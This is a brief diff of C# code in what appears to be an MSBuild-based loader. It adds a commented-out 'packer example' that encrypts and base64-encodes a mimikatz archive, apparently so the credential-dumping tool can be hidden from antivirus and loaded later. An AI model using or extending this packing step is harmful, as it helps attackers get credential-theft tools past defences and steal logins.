@@ -12,9 +12,13 @@ using System.Security.Cryptography;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 
-// Save this as Loader.xml
+// Packer Example
 /*
-
+byte[] b  = Misc.FileToByteArray(@"mimikatz_trunk.zip");
+byte[] e = Misc.Encrypt(b,"password"); //You can easily decouple the key from the code here.  Just for PoC
+string f = System.Convert.ToBase64String(e);
+File.WriteAllText(@"file.b64",f);
+Console.WriteLine("Finished");
 */
  
 /*
